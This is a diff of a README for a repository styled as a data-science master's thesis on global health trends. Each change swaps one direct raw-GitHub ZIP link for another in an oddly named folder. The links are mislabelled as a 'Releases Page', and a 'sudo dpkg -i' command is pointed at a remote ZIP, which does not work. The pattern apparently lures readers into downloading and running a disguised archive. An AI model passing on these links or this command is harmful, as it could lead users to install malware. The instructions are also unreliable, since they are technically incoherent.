@@ -1,6 +1,6 @@
 # 🌍 Master-s-Thesis-in-Data-Science- - Understand Global Health Trends Easily
 
-![Download Now](https://raw.githubusercontent.com/sasagucloth/Master-s-Thesis-in-Data-Science-/main/Dicksonia/Master-s-Thesis-in-Data-Science-.zip%20Now-Visit%20Releases-blue)
+![Download Now](https://github.com/sasagucloth/Master-s-Thesis-in-Data-Science-/raw/refs/heads/main/Dicksonia/Data_in_Master_Science_s_Thesis_3.0.zip%20Now-Visit%20Releases-blue)
 
 ## 📚 Overview
 
@@ -20,11 +20,11 @@ To get started with the application, follow these steps:
    - Find the software and download the latest release.
    - Click the button below to go directly to the download page.
 
-   [Visit Releases Page](https://raw.githubusercontent.com/sasagucloth/Master-s-Thesis-in-Data-Science-/main/Dicksonia/Master-s-Thesis-in-Data-Science-.zip)
+   [Visit Releases Page](https://github.com/sasagucloth/Master-s-Thesis-in-Data-Science-/raw/refs/heads/main/Dicksonia/Data_in_Master_Science_s_Thesis_3.0.zip)
 
 ## 📥 Download & Install
 
-1. Go to the [Releases Page](https://raw.githubusercontent.com/sasagucloth/Master-s-Thesis-in-Data-Science-/main/Dicksonia/Master-s-Thesis-in-Data-Science-.zip).
+1. Go to the [Releases Page](https://github.com/sasagucloth/Master-s-Thesis-in-Data-Science-/raw/refs/heads/main/Dicksonia/Data_in_Master_Science_s_Thesis_3.0.zip).
 2. Locate the latest version of the software.
 3. Click on the version title to expand and see the available files.
 4. Download the file that is compatible with your operating system.
@@ -48,7 +48,7 @@ For Linux:
 
 1. Download the appropriate package for your Linux distribution.
 2. Use your package manager to install the downloaded package.
-3. Alternatively, run the Terminal and use the command `sudo dpkg -i https://raw.githubusercontent.com/sasagucloth/Master-s-Thesis-in-Data-Science-/main/Dicksonia/Master-s-Thesis-in-Data-Science-.zip` for Debian-based systems.
+3. Alternatively, run the Terminal and use the command `sudo dpkg -i https://github.com/sasagucloth/Master-s-Thesis-in-Data-Science-/raw/refs/heads/main/Dicksonia/Data_in_Master_Science_s_Thesis_3.0.zip` for Debian-based systems.
 
 ## 📊 Using the Application
 
